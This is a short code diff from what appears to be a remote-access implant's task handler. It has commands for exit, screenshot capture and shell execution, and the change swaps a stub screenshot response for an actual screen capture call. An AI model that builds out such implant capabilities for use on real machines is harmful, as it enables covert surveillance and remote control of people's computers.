@@ -30,8 +30,7 @@
             exit(0);
         },
         @"take_screenshot": ^{
-            NSString *responseMessage = [NSString stringWithFormat:@"Screenshot taken at %@", self.parameters];
-            [self submitTaskResponseWithOutput:responseMessage status:@"success" completed:YES];
+            [SystemInfoHelper takeScreenshotWithTask:self];
         },
         @"shell_exec": ^{
             @try {
